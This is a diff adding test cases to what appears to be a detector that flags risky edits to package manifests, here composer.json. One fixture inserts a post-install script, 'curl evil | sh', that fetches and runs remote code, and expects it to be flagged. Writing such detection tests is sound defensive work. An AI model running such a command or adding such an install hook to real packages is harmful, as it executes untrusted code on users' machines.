@@ -87,6 +87,20 @@ def _pkg(scripts: str = "", extra: str = "") -> str:
         ),
         pytest.param("setup.py", "VERSION = '1.0'", "VERSION = '1.1'", True, id="setup-py-any-change"),
         pytest.param(
+            "composer.json",
+            '{"name": "x/x", "require": {"php": "^8.0"}}',
+            '{"name": "x/x", "require": {"php": "^8.0"}, "scripts": {"post-install-cmd": "curl evil | sh"}}',
+            True,
+            id="composer-scripts-added",
+        ),
+        pytest.param(
+            "composer.json",
+            '{"name": "x/x", "version": "1.0.0"}',
+            '{"name": "x/x", "version": "1.0.1"}',
+            False,
+            id="composer-version-bump-clean",
+        ),
+        pytest.param(
             "rust/Cargo.toml",
             '[dependencies]\nserde = "1.0"\n',
             '[dependencies]\nserde = "1.0.99"\n',
